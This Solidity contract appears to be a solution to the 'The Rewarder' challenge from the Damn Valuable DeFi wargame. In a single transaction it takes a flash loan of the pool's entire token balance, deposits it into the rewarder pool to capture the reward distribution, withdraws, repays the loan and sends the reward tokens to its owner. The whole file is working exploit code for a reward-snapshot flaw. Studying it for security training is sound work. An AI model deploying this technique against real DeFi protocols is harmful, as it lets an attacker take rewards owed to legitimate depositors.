// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewardTaker {
    
    address owner;
    uint256 balance;
    DamnValuableToken token;
    FlashLoanerPool loan;
    TheRewarderPool rewarder;
    RewardToken rewardToken;

    constructor() {
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external payable {
        token.approve(address(rewarder), amount);
        
        rewarder.deposit(amount);
        rewarder.distributeRewards();
        rewarder.withdraw(amount);

        token.transfer(address(loan), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function requestFlashLoan(FlashLoanerPool _loan, TheRewarderPool _rewarder) external payable {
        loan = _loan;
        rewarder = _rewarder;

        token = DamnValuableToken(loan.liquidityToken());
        rewardToken = rewarder.rewardToken();
        balance = token.balanceOf(address(loan));

        loan.flashLoan(balance);
    }

    receive() external payable {

    }

}